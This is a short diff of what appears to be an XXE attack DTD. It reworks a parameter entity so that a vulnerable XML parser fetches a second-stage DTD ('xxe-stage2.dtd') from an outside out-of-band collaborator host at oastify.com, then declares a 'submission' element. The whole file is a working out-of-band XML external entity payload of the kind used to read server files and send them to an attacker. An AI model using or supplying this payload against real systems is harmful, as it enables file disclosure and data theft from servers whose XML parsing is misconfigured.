@@ -1,5 +1,4 @@
-<!ENTITY % declare_ping "<!ENTITY &#x25; ping SYSTEM 'https://jh4xppkug3zo34v6ac003ygzdqjh7dv2.oastify.com/xxe-stage2.dtd'>">
-%declare_ping;
+<!ENTITY % ping SYSTEM "https://jh4xppkug3zo34v6ac003ygzdqjh7dv2.oastify.com/xxe-stage2.dtd">
 %ping;
 
 <!ELEMENT submission (#PCDATA)>
